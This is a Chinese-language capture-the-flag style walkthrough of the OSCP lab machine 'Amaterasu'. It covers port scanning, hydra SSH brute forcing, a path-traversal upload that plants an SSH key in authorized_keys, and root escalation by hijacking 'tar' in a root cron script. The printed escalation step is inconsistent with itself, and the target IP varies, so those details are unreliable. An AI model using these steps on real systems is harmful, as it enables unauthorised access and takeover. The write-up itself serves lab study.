# OSCP-Esay难度-Amaterasu

## 准备工作

启动VPN  
![](https://image.3001.net/images/20230722/1690040277_64bbf7d5168b9da001294.png!small)

启动靶机  
![](https://image.3001.net/images/20230722/1690040278_64bbf7d607032ccfd5abd.png!small)

## 目标确认

获取目标机器IP > `192.168.244.249`

![](https://image.3001.net/images/20230722/1690040278_64bbf7d6b1989f352ae72.png!small)

利用ip a 获取攻击机IP > `192.168.45.168`  
![](https://image.3001.net/images/20230722/1690040279_64bbf7d7aeea3ea36567d.png!small)

## 端口收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# sudo nmap --min-rate 10000 -p- 192.168.244.249
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-22 00:08 CST
    Nmap scan report for 192.168.244.249
    Host is up (0.26s latency).
    Not shown: 65524 filtered tcp ports (no-response)
    PORT      STATE  SERVICE
    21/tcp    open   ftp
    22/tcp    closed ssh
    111/tcp   closed rpcbind
    139/tcp   closed netbios-ssn
    443/tcp   closed https
    445/tcp   closed microsoft-ds
    2049/tcp  closed nfs
    10000/tcp closed snet-sensor-mgmt
    25022/tcp open   unknown
    33414/tcp open   unknown
    40080/tcp open   unknown
    

![](https://image.3001.net/images/20230722/1690040280_64bbf7d8923cd405a49d5.png!small)  
>[!通过各两次扫描收集到端口 ]  
> ?21,22,111,139,443,445,2049,10000,25022,33414,40080

### 目标端口对应服务探测

    
    
    # tcp探测
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# sudo nmap -sT -sV -O -sC -p21,22,111,139,443,445,2049,10000,25022,33414,40080 192.168.244.249
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-22 00:12 CST
    Nmap scan report for 192.168.244.249                                 Host is up (0.26s latency).                                                                                                               PORT      STATE  SERVICE          VERSION                            21/tcp    open   ftp              vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)               |_Can't get directory listing: TIMEOUT                               | ftp-syst:                                                          |   STAT:                                                            | FTP server status:                                                 |      Connected to 192.168.45.168                                   |      Logged in as ftp                                              |      TYPE: ASCII                                                   |      No session bandwidth limit                                    |      Session timeout in seconds is 300                             |      Control connection is plain text
    22/tcp    closed ssh
    111/tcp   closed rpcbind
    139/tcp   closed netbios-ssn
    443/tcp   closed https
    445/tcp   closed microsoft-ds
    2049/tcp  closed nfs
    10000/tcp closed snet-sensor-mgmt
    25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
    | ssh-hostkey: 
    |   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
    |_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
    33414/tcp open   unknown
    | fingerprint-strings: 
    |   GetRequest: 
    |     HTTP/1.1 404 NOT FOUND
    |     Server: Werkzeug/2.2.3 Python/3.9.13
    |     Date: Fri, 21 Jul 2023 16:12:42 GMT
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 207
    |     Connection: close
    |
    |
    |     404 Not Found
    40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
    | http-methods: 
    |_  Potentially risky methods: TRACE 
    |_http-server-header: Apache/2.4.53 (Fedora)
    |_http-title: My test page
    

![](https://image.3001.net/images/20230722/1690040281_64bbf7d97ff61e97fac07.png!small)  
![](https://image.3001.net/images/20230722/1690040282_64bbf7da9a0615e149b6b.png!small)  
![](https://image.3001.net/images/20230722/1690040283_64bbf7dbd29a7c0fe5d1e.png!small)  
![](https://image.3001.net/images/20230722/1690040284_64bbf7dce80a638867b1f.png!small)

## 信息收集-端口测试

总体来看的话，开放了4个端口?  
21-ftp、25022-ssh、33414-tcp、40080-http

### 21-FTP端口的信息收集

#### 21-FTP版本版本信息(确认)

通过`Nmap`探测获得FTP的版本信息，可以大致推测FTP的配置文件位置

    
    
    # 如果探测版本为vsftpd 3.0.3
    cat /etc/vsftpd.conf
    

#### 21-FTP端口匿名登录测试(存在)

尝试匿名账号`anonymous`以及无密码进行登录测试

    
    
    # 利用ftp协议+ip进行连接测试
    ftp 192.168.244.249
    Name: anonymous
    

![](https://image.3001.net/images/20230722/1690040286_64bbf7de2a6be823c152d.png!small)

#### 21-FTP端口-文件GET收集(失败)

登录FTP之后利用`ls`查看存在哪些目录，翻阅的同时查看一下文件权限  
利用`GET`下载文件

    
    
    # binary 以二进制模式传输文件，保证文件完整
    ftp > binary
    # 查看目录结构
    ftp > ls -al
    

进入了扩展模式，没东西

![](https://image.3001.net/images/20230722/1690040286_64bbf7def3ccb7f5a62a2.png!small)

### 25022-SSH端口的信息收集

目标 ssh 192.168.244.249:25022

#### 25022-SSH弱口令爆破(失败)

尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为4

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/password.lst  192.168.242.249 ssh -t4 -s 25022
    

![](https://image.3001.net/images/20230722/1690040287_64bbf7dfbb0ab61ddc01e.png!small)  
放着持续爆破，我们进行下一项内容

#### 25022-SSH手动登录尝试(失败)

尝试`root`账户的密码爆破发现报错之后进行手动尝试

    
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# ssh root<span class="label label-primary">@192.168.242.249</span> -p 25022
    root<span class="label label-primary">@192.168.242.249's</span> password: 
    Permission denied, please try again.
    

![](https://image.3001.net/images/20230722/1690040289_64bbf7e10eef7e7d3785e.png!small)

### 33414端口信息收集

http://192.168.242.249:33414

根据nmap探测信息33414是一个tcp协议，可以http访问

![](https://image.3001.net/images/20230722/1690040290_64bbf7e24d20838e699b8.png!small)  
当访问了之后发现显示的是不能直接进行访问

![](https://image.3001.net/images/20230722/1690040291_64bbf7e30a596fc6b8c0a.png!small)  
这时候简单的进行了chatgpt问答确定`Werkzeug`是什么，决定使用目录扫描

    
    
    Werkzeug是一个Python的WSGI工具库，用于构建Web应用程序和框架。Werkzeug提供了一套灵活的工具，用于处理HTTP请求和响应、路由请求、处理会话、进行调试等等。
    

#### 信息收集-dirsearch基础目录扫描

    
    
    dirsearch -u http://192.168.242.249:33414 -x 302,403
    

发现了`help`和`info`接口

![](https://image.3001.net/images/20230722/1690040291_64bbf7e3e01a755721028.png!small)

#### 信息收集-dirsearch深度目录扫描(待选)

先看一下`help`和`info`接口有无信息吧，没有的话可以考虑挂着深度扫描

#### 信息收集-目录访问

  * 在http://192.168.242.249:33414/help端点中发现4个接口信息

![](https://image.3001.net/images/20230722/1690040292_64bbf7e4c17953d0df899.png!small)

    
    
    0	"GET /info : General Info"
    1	"GET /help : This listing"
    2	"GET /file-list?dir=/tmp : List of the files"
    3	"POST /file-upload : Upload files"
    

  * 在http://192.168.242.249:33414/info端点发现了基础信息

![](https://image.3001.net/images/20230722/1690040293_64bbf7e5846f264d8d48b.png!small)

### 40080端口信息收集(待选)

访问 http://192.168.242.249:40080 是火狐的一个界面。首先探索一下33414

![](https://image.3001.net/images/20230722/1690040294_64bbf7e661d84a014b2f8.png!small)

## 漏洞利用-getwebshell

### /file-list端点探索

端点`/file-list?dir=/tmp`下发现了文件信息

![](https://image.3001.net/images/20230722/1690040295_64bbf7e75ae050f1062a5.png!small)

![](https://image.3001.net/images/20230722/1690040296_64bbf7e8546cad04b3f7c.png!small)  
`/tmp`是缓存目录，尝试修改`dir`到其他目录，发现成功

![](https://image.3001.net/images/20230722/1690040297_64bbf7e95ac6c4bc7b672.png!small)

![](https://image.3001.net/images/20230722/1690040298_64bbf7ea5bc49e7fe39dc.png!small)  
说明该功能点是具有读取路径的功能，尝试文件读取，发现失败

![](https://image.3001.net/images/20230722/1690040299_64bbf7eb38d6bc455ceed.png!small)

![](https://image.3001.net/images/20230722/1690040300_64bbf7ec2e437900dc066.png!small)

### /file-upload端点探索

可以确认是一个上传功能点

    
    
    curl http://192.168.242.249:33414/file-upload
    

![](https://image.3001.net/images/20230722/1690040301_64bbf7ed00421b65227f9.png!small)

    
    
    # GET模式不允许的我们改成POST
    curl -X POST http://192.168.242.249:33414/file-upload
    

![](https://image.3001.net/images/20230722/1690040301_64bbf7edc99450df53859.png!small)

问了一下`chatgpt`得到的结论是需要`-F "file=<span class="label label-primary">@/path/to/file</span>"`

    
    
    # 创建一个文件
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# touch test.abcd
    # 上传
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl -X POST -F file="<span class="label label-primary">@/home/bachang/Amaterasu/test.abcd</span>" http://192.168.242.249:33414/file-upload
    {"message":"No filename part in the request"}
    

![](https://image.3001.net/images/20230722/1690040302_64bbf7ee89753be5572cd.png!small)

    
    
    # No filename part  需要文件名
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl -X POST -F file="<span class="label label-primary">@/home/bachang/Amaterasu/test.abcd</span>" -F filename=a http://192.168.242.249:33414/file-upload
    {"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
    

![](https://image.3001.net/images/20230722/1690040303_64bbf7ef3c5855f49b305.png!small)

根据需求尝试进行修改

    
    
    # 上传的文件名必须符合白名单
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl -X POST -F file="<span class="label label-primary">@/home/bachang/Amaterasu/test.txt</span>" -F filename=a.txt http://192.168.242.249:33414/file-upload
    {"message":"File successfully uploaded"}
    

![](https://image.3001.net/images/20230722/1690040304_64bbf7f000c7e19d4b442.png!small)

查看了一下文件上传的位置，发现是在`/tmp`目录下

    
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl http://192.168.242.249:33414/file-list?dir=/tmp
    ["a.txt",....]
    

![](https://image.3001.net/images/20230722/1690040304_64bbf7f0c84afc2dd3e09.png!small)

### 端点漏洞利用

如果存在上传以及读取有哪些利用方式呢？  
上传可以覆盖一些文件让我们登录，确认是否可以上传目录穿越

    
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl -X POST -F file="<span class="label label-primary">@/home/bachang/Amaterasu/test.txt</span>" -F filename=../a.txt http://192.168.242.249:33414/file-upload
    
    
    500 Internal Server Error
    <h1>Internal Server Error</h1>
    <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
    

![](https://image.3001.net/images/20230722/1690040305_64bbf7f1ee5759d149961.png!small)

错误是无法完成请求，说明尝试写入到根目录中，没有权限

利用路径读取寻找有用的写入点，除了tmp之外应该还有用户权限的地方可以写入

    
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl http://192.168.242.249:33414/file-list?dir=/home
    ["alfredo"]
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl http://192.168.242.249:33414/file-list?dir=/home/alfredo
    [".bash_logout",".bash_profile",".bashrc","local.txt",".ssh","restapi",".bash_history"]
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl http://192.168.242.249:33414/file-list?dir=/home/alfredo/.ssh
    ["id_rsa","id_rsa.pub"]
    

发现存在`alfredo`的用户，存在`.ssh`的文件夹，可以尝试该文件夹是否可以上传

    
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl -X POST -F file="<span class="label label-primary">@/home/bachang/Amaterasu/test.txt</span>" -F filename=/home/alfredo/.ssh/a.txt http://192.168.242.249:33414/file-upload
    {"message":"File successfully uploaded"}
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl http://192.168.242.249:33414/file-list?dir=/home/alfredo/.ssh
    ["id_rsa","id_rsa.pub","a.txt"]
    

![](https://image.3001.net/images/20230722/1690040307_64bbf7f31187aa3829e45.png!small)

考虑上传攻击机的`authorized_keys`到`alfredo`的用户，进行密钥ssh登录

首先在攻击机上生成对应的密钥对

    
    
    ssh-keygen -t rsa
    
    ...
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# ls
    text.txt  text.txt.pub
    

![](https://image.3001.net/images/20230722/1690040308_64bbf7f4016d8fcc67b34.png!small)

接着在文件上传点尝试上传`id_rsa_test.pub`  
利用目录穿越的方式将其上传到/home/alfredo/.ssh/authorized_keys

    
    
    # 先修改白名单后缀
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# mv text.txt.pub text.txt.txt
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# ls
    hydra.restore  text.txt  text.txt.txt
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# curl -X POST -F file="<span class="label label-primary">@/home/bachang/Amaterasu/text.txt.txt</span>" -F filename=/home/alfredo/.ssh/authorized_keys http://192.168.242.249:33414/file-upload
    {"message":"File successfully uploaded"}
    

![](https://image.3001.net/images/20230722/1690040309_64bbf7f53391104ce9d39.png!small)

同时在file-list接口也成功列出来我们上传的公钥文件

![](https://image.3001.net/images/20230722/1690040310_64bbf7f60d30a0ce7d048.png!small)

## 内网遨游-getshell

### SSH密钥登录

获取密钥之后指定密钥进行登录

    
    
    ┌──(root㉿Kali)-[/home/bachang/Amaterasu]
    └─# ssh -i text.txt alfredo<span class="label label-primary">@192.168.242.249</span> -p25022
    Last login: Tue Mar 28 03:21:25 2023
    [alfredo<span class="label label-primary">@fedora</span> ~]$
    

### FLAG1获取

    
    
    [alfredo<span class="label label-primary">@fedora</span> ~]$ find / -name local.txt 2>/dev/null
    /home/alfredo/local.txt
    [alfredo<span class="label label-primary">@fedora</span> ~]$ cat /home/alfredo/local.txt
    *****************************************
    

![](https://image.3001.net/images/20230722/1690040310_64bbf7f6ca9c4a17bf5f6.png!small)

### 权限提升

#### Linux提权-sudo提权尝试(无)

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码

![](https://image.3001.net/images/20230722/1690040311_64bbf7f7df3626296f5a9.png!small)

#### Linux提权-suid提权尝试(无)

    
    
    # -perm 文件权限
    [alfredo<span class="label label-primary">@fedora</span> ~]$ find / -perm -u=s -type f 2>/dev/null
    /usr/bin/fusermount
    /usr/bin/chage
    /usr/bin/gpasswd
    /usr/bin/newgrp
    /usr/bin/su
    /usr/bin/mount
    /usr/bin/umount
    /usr/bin/pkexec
    /usr/bin/crontab
    /usr/bin/fusermount3
    /usr/bin/sudo
    /usr/bin/passwd
    /usr/bin/chfn
    /usr/bin/chsh
    /usr/bin/at
    /usr/bin/staprun
    /usr/sbin/grub2-set-bootflag
    /usr/sbin/pam_timestamp_check
    /usr/sbin/unix_chkpwd
    /usr/sbin/mount.nfs
    /usr/lib/polkit-1/polkit-agent-helper-1
    /usr/libexec/cockpit-session
    

没找到什么比较好的提权内容

#### Linux提权-suid-getcap提权尝试(无)

    
    
    # 探查有CAP_SETUID标志的进程
    [alfredo<span class="label label-primary">@fedora</span> ~]$ /usr/sbin/getcap -r / 2>/dev/null
    /usr/bin/newgidmap cap_setgid=ep
    /usr/bin/newuidmap cap_setuid=ep
    /usr/bin/arping cap_net_raw=p
    /usr/bin/clockdiff cap_net_raw=p
    /usr/sbin/suexec cap_setgid,cap_setuid=ep
    /usr/sbin/mtr-packet cap_net_raw=ep
    

#### Linux提权-Cron job提权尝试

#### /etc/crontab提权

    
    
    # 寻找定时任务并修改进行提权
    PATH=/sbin:/bin:/usr/sbin:/usr/bin
    MAILTO=root
    
    # For details see man 4 crontabs
    
    # Example of job definition:
    # .---------------- minute (0 - 59)
    # |  .------------- hour (0 - 23)
    # |  |  .---------- day of month (1 - 31)
    # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
    # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
    # |  |  |  |  |
    # *  *  *  *  * user-name  command to be executed
    
    */1 * * * * root /usr/local/bin/backup-flask.sh
    

发现每过一分钟会以执行一次`backup-flask.sh`

    
    
    # 确定我们是否可以改
    [alfredo<span class="label label-primary">@fedora</span> ~]$ ls -al cat /usr/local/bin/backup-flask.sh
    ls: cannot access 'cat': No such file or directory
    -rwxr-xr-x. 1 root root 106 Mar 28 03:18 /usr/local/bin/backup-flask.sh
    
    # 查看内容
    [alfredo<span class="label label-primary">@fedora</span> ~]$ cat /usr/local/bin/backup-flask.sh
    #!/bin/sh
    export PATH="/home/alfredo/restapi:$PATH"
    cd /home/alfredo/restapi
    tar czf /tmp/flask.tar.gz *
    

`backup-flask.sh`会将用户下设置成环境变量并且执行一次tar  
因为我们用户环境可控，所以我们自己做一个tar的命令进行任务计划帮助提权

##### 可以做一个反弹shell(失败)

##### 提升bash的suid

    
    
    # 查看bash权限
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ ls -al /bin/bash
    -rwxr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
    # 写一个提bash权命令 增加suid
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ echo "chmod +u+s /bin/bash" > tar
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ cat tar
    chmod 777 /bin/bash
    # 增加执行权限
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ chmod +x tar
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ cat tar
    chmod 777 /bin/bash
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ ls -al /bin/bash
    -rwxrwxrwx. 1 root root 1390080 Jan 25  2021 
    # 成功提升权限
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ ls -al /bin/bash
    -rwxrwxrwx. 1 root root 1390080 Jan 25  2021 /bin/bash
    # bash -p 获得权限
    [alfredo<span class="label label-primary">@fedora</span> restapi]$ bash -p
    bash-5.1# whoami
    root
    

##### 可以把密钥cp到root中直接免密登录(懒)

### FLAG2获取

    
    
    bash-5.1# cat /root/proof.txt
    **********************************
    

